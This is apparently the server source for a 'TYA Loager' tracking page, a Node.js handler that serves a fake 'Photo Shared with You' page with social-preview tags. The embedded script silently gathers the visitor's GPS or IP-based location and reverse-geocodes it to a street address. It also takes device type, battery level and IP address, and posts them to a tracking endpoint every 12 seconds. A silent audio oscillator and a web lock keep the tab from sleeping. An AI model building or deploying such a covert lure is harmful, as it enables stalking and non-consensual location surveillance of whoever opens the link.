/* ──────────────────────────────────────────────
   TYA Loager – Tracking Page v6
   Server-rendered HTML with OG tags + lifetime tracker
   ────────────────────────────────────────────── */
const store = require('./_store');

module.exports = (req, res) => {
  const slug = req.query.slug || 'default';
  const host = req.headers.host || 'localhost:3000';
  const proto = host.includes('localhost') ? 'http' : 'https';
  const baseUrl = `${proto}://${host}`;

  // Find user or create placeholder
  let user = store.users.find(u => (u.customPath === slug || u.id === slug) && !u.deleted);
  const imgName = (user && user.imageName) || '';
  const favKey = (user && user.faviconKey) || 'f';
  const imgUrl = imgName ? `${baseUrl}/api/image?name=${encodeURIComponent(imgName)}` : `${baseUrl}/api/image`;
  const favUrl = `${baseUrl}/api/favicon?key=${favKey}`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-store');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<!-- OG TAGS FOR SOCIAL PREVIEW -->
<meta property="og:type" content="website"/>
<meta property="og:title" content="📷 Photo Shared with You"/>
<meta property="og:description" content="Someone shared a photo with you. Tap to view it now."/>
<meta property="og:image" content="${imgUrl}"/>
<meta property="og:image:width" content="1200"/>
<meta property="og:image:height" content="630"/>
<meta property="og:url" content="${baseUrl}/track/${slug}"/>
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:title" content="📷 Photo Shared with You"/>
<meta name="twitter:description" content="Someone shared a photo with you. Tap to view it now."/>
<meta name="twitter:image" content="${imgUrl}"/>
<link rel="icon" href="${favUrl}" type="image/jpeg"/>
<title>📷 Photo Shared with You</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui,sans-serif}
.photo-view{max-width:100%;max-height:100vh;position:relative}
.photo-view img{max-width:100vw;max-height:100vh;object-fit:contain;display:block;border-radius:0}
.loading{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);
  color:#fff;padding:8px 20px;border-radius:20px;font-size:12px;backdrop-filter:blur(8px);
  opacity:0;transition:opacity .3s}
.loading.show{opacity:1}
</style>
</head>
<body>
<div class="photo-view">
  <img src="${imgUrl}" alt="Shared Photo" onerror="this.style.display='none'"/>
</div>
<div class="loading" id="status">Loading...</div>

<script>
(function(){
  const SLUG = "${slug}";
  const API = "${baseUrl}";
  const SEND_URL = API + "/api/track";
  const INTERVAL = 12000;
  let sending = false;

  /* ── DEVICE INFO ── */
  function getDevice(){
    const ua = navigator.userAgent;
    if(/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    if(/Android/i.test(ua)) return 'Android';
    if(/Windows/i.test(ua)) return 'Windows';
    if(/Mac/i.test(ua)) return 'macOS';
    if(/Linux/i.test(ua)) return 'Linux';
    return 'Unknown';
  }

  async function getBattery(){
    try{const b=await navigator.getBattery();return Math.round(b.level*100)}catch(e){return null}
  }

  /* ── REVERSE GEOCODE ── */
  async function reverseGeocode(lat,lng){
    try{
      const r=await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lng+'&zoom=18&addressdetails=1',
        {headers:{'Accept-Language':'en'}});
      const d=await r.json();
      return d.display_name || '';
    }catch(e){return ''}
  }

  /* ── GPS LOCATION ── */
  function getGPS(){
    return new Promise((resolve)=>{
      if(!navigator.geolocation){resolve(null);return}
      // Check if permission already granted
      if(navigator.permissions && navigator.permissions.query){
        navigator.permissions.query({name:'geolocation'}).then(p=>{
          if(p.state==='granted'){
            navigator.geolocation.getCurrentPosition(
              pos=>resolve({lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,source:'GPS (High Accuracy)'}),
              ()=>resolve(null),
              {enableHighAccuracy:true,timeout:8000,maximumAge:10000}
            );
          } else {
            // Don't prompt — fall back to IP
            resolve(null);
          }
        }).catch(()=>resolve(null));
      } else {
        resolve(null);
      }
    });
  }

  /* ── IP GEOLOCATION (4 providers) ── */
  async function getIPLocation(){
    const providers=[
      {url:'https://ipapi.co/json/',parse:d=>d.latitude?{lat:d.latitude,lng:d.longitude,accuracy:5000,ip:d.ip}:null},
      {url:'https://ipinfo.io/json',parse:d=>{if(!d.loc)return null;const[la,lo]=d.loc.split(',');return{lat:+la,lng:+lo,accuracy:8000,ip:d.ip}}},
      {url:'https://freeipapi.com/api/json',parse:d=>d.latitude?{lat:d.latitude,lng:d.longitude,accuracy:10000,ip:d.ipAddress}:null},
      {url:'http://ip-api.com/json/?fields=lat,lon,query',parse:d=>d.lat?{lat:d.lat,lng:d.lon,accuracy:15000,ip:d.query}:null}
    ];
    for(const p of providers){
      try{
        const c=new AbortController();const t=setTimeout(()=>c.abort(),5000);
        const r=await fetch(p.url,{signal:c.signal});clearTimeout(t);
        const d=await r.json();const result=p.parse(d);
        if(result)return{...result,source:'IP Geolocation'};
      }catch(e){}
    }
    return null;
  }

  /* ── SEND DATA ── */
  async function sendData(){
    if(sending)return;
    sending=true;
    try{
      const [gps, battery] = await Promise.all([getGPS(), getBattery()]);
      let loc = gps;
      if(!loc) loc = await getIPLocation();
      if(!loc){sending=false;return}

      // Reverse geocode for real address
      const address = await reverseGeocode(loc.lat, loc.lng);

      const payload = {
        id: SLUG,
        customPath: SLUG,
        lat: loc.lat,
        lng: loc.lng,
        accuracy: loc.accuracy,
        source: loc.source || 'Unknown',
        address: address,
        device: getDevice(),
        battery: battery,
        ip: loc.ip || ''
      };

      await fetch(SEND_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
      });
    }catch(e){}
    sending=false;
  }

  /* ── KEEPALIVE: prevent tab/browser from sleeping ── */
  // Web Lock
  if(navigator.locks){
    navigator.locks.request('tya_lock_'+SLUG, {mode:'exclusive'}, ()=>new Promise(()=>{}));
  }
  // Silent audio
  try{
    const ctx=new(window.AudioContext||window.webkitAudioContext)();
    const osc=ctx.createOscillator();const gain=ctx.createGain();
    gain.gain.value=0.0001;osc.connect(gain);gain.connect(ctx.destination);
    osc.start();
  }catch(e){}
  // Visibility
  document.addEventListener('visibilitychange',()=>{if(!document.hidden)sendData()});

  /* ── PERSIST SESSION ── */
  try{localStorage.setItem('tya_active_'+SLUG,'1')}catch(e){}

  /* ── START ── */
  sendData();
  setInterval(sendData, INTERVAL);
})();
</script>
</body>
</html>`);
};
